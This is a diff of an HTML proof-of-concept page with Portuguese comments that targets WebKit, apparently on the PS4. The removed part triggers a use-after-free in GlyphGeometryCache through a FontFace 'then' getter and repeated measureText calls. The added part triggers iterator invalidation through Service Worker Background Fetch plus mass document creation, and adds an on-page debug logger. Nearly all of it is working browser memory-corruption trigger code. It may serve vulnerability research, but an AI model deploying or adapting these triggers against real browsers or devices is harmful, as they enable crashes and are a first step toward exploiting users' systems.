@@ -1,90 +1,76 @@
 <!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"></head>
+<body>
 <script>
-// UAF GlyphGeometryCache bucket rehash — adaptacao do Teste 1 do commit b4722e2
-// rdar://186024085 / https://bugs.webkit.org/show_bug.cgi?id=323067
-//
-// MECANISMO (diferente dos PoCs anteriores):
-//   FontCascade::width() armazena raw pointer para o bucket array de
-//   GlyphGeometryCache. O getter forca um rehash do cache chamando
-//   measureText() 32 vezes com strings diferentes → cache cresce →
-//   bucket array e realocado → old bucket FREED → raw pointer DANGLING
-//   → width() continua a escrever no ponteiro dangling → UAF WRITE → CRASH
-//
-// DIFERENCAS do PoC anterior (42b1e2a):
-//   Anterior: getter chama document.fonts.add() → m_cache.clear() / m_fonts
-//   Este:     getter chama measureText() x32 → GlyphGeometryCache rehash
-//
-//   Anterior: precisa de dummies para pruneUnreferencedEntries
-//   Este:     50 pre-calls de measureText() populam o cache suficientemente
-//
-// ADAPTACOES para PS4:
-//   OffscreenCanvas → document.createElement('canvas')
-//   local(Helvetica) → Ahem.woff data URL (garantia de carregamento sincrono)
-//   FontFace.prototype.then → face.then (instancia, confirmado no PS4)
-
-fetch('resources/Ahem.woff')
-    .then(function(r) { return r.arrayBuffer(); })
-    .then(function(b) {
-        return new Promise(function(res, rej) {
-            var fr = new FileReader();
-            fr.onload  = function(e) { res(e.target.result); };
-            fr.onerror = rej;
-            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
-        });
-    })
-    .then(function(dataUrl) {
-
-        function attempt(n) {
-            var family = 'VarFam' + n;
-            var face = new FontFace(family, 'url("' + dataUrl + '")');
-            void face.loaded;
-            document.fonts.add(face);
-
-            // Canvas DOM (substitui OffscreenCanvas do upstream)
-            var c = document.createElement('canvas');
-            c.width = 200; c.height = 50;
-            c.style.cssText = 'position:absolute;left:-9999px';
-            document.body.appendChild(c);
-            var ctx = c.getContext('2d');
-
-            // Times como primary (cobre Latin), family como fallback (Cherokee)
-            ctx.font = '20px Times, ' + family;
-
-            var inGetter = false;
-            Object.defineProperty(face, 'then', {
-                configurable: true,
-                get: function() {
-                    if (inGetter) return undefined;
-                    inGetter = true;
-                    // 32 measureText calls com strings diferentes forcam
-                    // GlyphGeometryCache a crescer e fazer rehash.
-                    // O bucket array antigo e liberado enquanto a outer
-                    // measureText ainda tem um raw pointer nele → UAF write.
-                    for (var i = 0; i < 16; i++) {
-                        try { ctx.measureText('q' + String.fromCharCode(65 + i) + 'z'); } catch(e) {}
-                        try { ctx.measureText('x'); } catch(e) {}
-                    }
-                    inGetter = false;
-                    return undefined;
-                }
-            });
-
-            // 50 pre-calls para popular o GlyphGeometryCache com entradas
-            // de Times/Latin, aumentando a probabilidade de rehash quando
-            // o getter adiciona mais 32 entradas de Cherokee/family
-            for (var i = 0; i < 50; i++)
-                ctx.measureText('x');
-
-            // Cherokee ausente em Times → glyph walk cai para family (Ahem)
-            // → opportunisticallyStartFontDataURLLoading(face) SINCRONO
-            // → face.loaded resolved → thenable check → getter dispara
-            // → 32x measureText → GlyphGeometryCache rehash → old bucket FREED
-            // → outer measureText raw pointer DANGLING → UAF WRITE → CRASH
-            ctx.measureText('\u13A0\u13A2\u13A4');
-        }
-
-        for (var n = 0; n < 3; n++) {
-            try { attempt(n); } catch(e) {}
-        }
-    });
+(function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] N�o foi poss�vel carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
 </script>
+<button id="start">Iniciar teste (requer HTTPS ou localhost)</button>
+<pre id="log"></pre>
+<script>
+const logEl = document.getElementById('log');
+function log(msg, color = '#fff') {
+  const d = document.createElement('div');
+  d.style.color = color;
+  d.textContent = msg;
+  logEl.appendChild(d);
+}
+
+// Service Worker m�nimo (equivalente ao change-documents-in-progress-event-sw.js do commit)
+const SW_SOURCE = `
+self.addEventListener('install', e => self.skipWaiting());
+self.addEventListener('activate', e => self.clients.claim());
+`;
+
+async function runTest() {
+  if (!('serviceWorker' in navigator)) {
+    log('Service Worker indispon�vel � skip', '#f80');
+    return;
+  }
+  if (!('backgroundFetch' in (await navigator.serviceWorker.ready).registration || {})) {
+    log('Background Fetch API indispon�vel � skip', '#f80');
+    return;
+  }
+
+  // Pre-populate allDocumentsMap so the matching Document is not the only entry.
+  let preDocs = [];
+  for (let i = 0; i < 8; i++)
+    preDocs.push(document.implementation.createHTMLDocument());
+
+  const swBlob = new Blob([SW_SOURCE], { type: 'application/javascript' });
+  const swUrl = URL.createObjectURL(swBlob);
+
+  const swr = await navigator.serviceWorker.register(swUrl, { scope: './' });
+  await navigator.serviceWorker.ready;
+
+  const request = await swr.backgroundFetch.fetch(
+    'repro-' + Date.now(),
+    ['/favicon.ico'] // qualquer recurso same-origin serv�vel
+  );
+
+  let newDocs = [];
+  let fired = false;
+
+  let resolveCallback;
+  const promise = new Promise(resolve => resolveCallback = resolve);
+
+  request.onprogress = () => {
+    if (fired) return;
+    fired = true;
+    log('progress disparado � criando 512 documentos para invalidar o iterador do HashTable�', '#0f0');
+    for (let i = 0; i < 512; i++)
+      newDocs.push(document.implementation.createHTMLDocument());
+    resolveCallback();
+  };
+
+  await promise;
+  log('PASS � nenhum crash (se o WebKit for corrigido) ou crash silencioso (se vulner�vel)', '#0f0');
+}
+
+document.getElementById('start').addEventListener('click', () => {
+  logEl.innerHTML = '';
+  runTest().catch(e => log('ERRO: ' + e.message, '#f55'));
+});
+</script>
+</body>
+</html>
